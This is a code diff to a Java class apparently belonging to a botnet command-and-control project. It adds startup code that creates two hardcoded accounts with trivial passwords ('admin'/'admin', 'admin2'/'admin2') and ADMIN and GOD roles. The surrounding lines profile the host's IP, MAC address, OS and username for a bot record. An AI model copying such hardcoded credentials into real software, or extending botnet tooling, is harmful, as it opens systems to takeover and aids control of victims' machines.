@@ -8,8 +8,10 @@ import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.SignatureException;
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.List;
 import java.util.Random;
+import java.util.Set;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
@@ -26,6 +28,7 @@ import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
+import cs.sii.model.role.Role;
 import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
 import cs.sii.network.request.CecRequest;
@@ -88,6 +91,21 @@ public class Commando {
 		nServ.getAliveBot().add(botAlive);
 		pServ.initP2P();
 		System.out.println("peer to peer fatto");
+		
+		
+		
+		Role admin=new Role("ADMIN");
+		rServ.save(admin);	
+		Set<Role> roleSet=new HashSet<Role>();
+		roleSet.add(admin);
+		uServ.save(new User("admin","admin", "a", "b", "ad", roleSet));
+		
+		Role god=new Role("GOD");
+		rServ.save(god);
+		roleSet.add(god);
+		uServ.save(new User("admin2","admin2", "a2", "b2", "ad2", roleSet));
+		
+		
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
 				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
 				(nServ.isElegible() + ""));
